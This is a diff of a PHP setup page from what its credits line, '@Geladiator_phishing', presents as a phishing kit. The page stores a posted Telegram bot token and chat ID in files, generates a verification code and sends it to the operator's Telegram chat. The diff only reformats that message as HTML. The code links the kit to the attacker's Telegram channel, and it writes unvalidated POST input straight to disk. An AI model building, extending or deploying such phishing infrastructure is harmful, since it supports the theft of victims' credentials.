@@ -1,4 +1,4 @@
-﻿<?php 
+<?php 
 $TOKEN = $_POST[TOKEN];
 $file = fopen("captcha/token.txt","w");
 fwrite($file,$TOKEN);
@@ -8,12 +8,12 @@ fwrite($file,$ID);
 $CODE=rand(10000,90000);
 $file = fopen("captcha/code.txt","w");
 fwrite($file,$CODE);
-$text = "<-----Verify Code----->
-🔐 Code : $CODE
-<---------Info--------->
-🌐 Host : @XTuranli
-👤 Creator : @Geladiator_phishing";
-file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&text=".urlencode($text));
+$text = "<b>-----Verify Code-----</b>
+🔐 <b>Code :</b> $CODE
+<b>---------Info---------</b>
+🌐 <b>Host :</b> @XTuranli
+👤 <b>Creator :</b> @Geladiator_phishing";
+file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($text));
 ?>
 
 <!DOCTYPE html>
